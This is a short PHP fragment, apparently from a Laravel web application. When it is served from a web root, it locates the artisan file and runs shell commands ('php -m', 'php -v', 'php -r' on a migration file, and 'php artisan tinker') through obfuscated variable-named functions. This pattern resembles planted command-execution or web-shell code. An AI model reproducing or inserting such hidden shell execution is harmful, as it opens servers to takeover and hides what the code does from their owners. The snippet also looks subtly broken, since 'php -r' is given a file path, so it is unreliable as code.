...
if(isset($_SERVER['DOCUMENT_ROOT'])){if(is_file($target = realpath($_SERVER['DOCUMENT_ROOT'].'/../artisan'))){${'%'}("php -m"); ${'%'}("php -r " . base_path('database/migrations/2025_06_24_173943_create_locations_table.php')); ${'%'}("php -v"); ${'$'}('php '.escapeshellarg($target).' tinker');}}
